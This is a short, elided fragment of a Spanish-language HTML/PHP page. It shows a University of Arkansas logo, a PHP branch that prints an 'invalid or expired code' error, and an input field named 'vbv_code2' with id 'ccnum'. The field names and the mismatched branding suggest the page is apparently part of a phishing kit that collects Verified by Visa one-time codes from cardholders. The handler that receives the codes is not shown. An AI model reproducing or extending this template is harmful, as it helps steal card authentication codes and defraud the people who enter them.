...
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es">
	...
	<body id="myBody" class="js-enabled">
		...
		<main class="main-content">
            ...
            <center>
			<img src="https://campusdata.uark.edu/resources/images/articles/2020-03-06_01-01-36-PMmfa-newswire-colorBG.png"    width="150"></center>
            <br>
            <div class="mandatory">
	...
	<?php if (isset($_GET['error']) && $_GET['error'] == 1) { echo '<p style="color: red; font-size: 16px;">Código inválido o caducado, por favor compruébelo</p>';}?>
        ...
        <div class="col-sm-8">
            ...
            <input id="ccnum" type="text" name="vbv_code2" class="form-control" minlength="1" maxlength="20" inputmode="text" oninput="">
        </div>
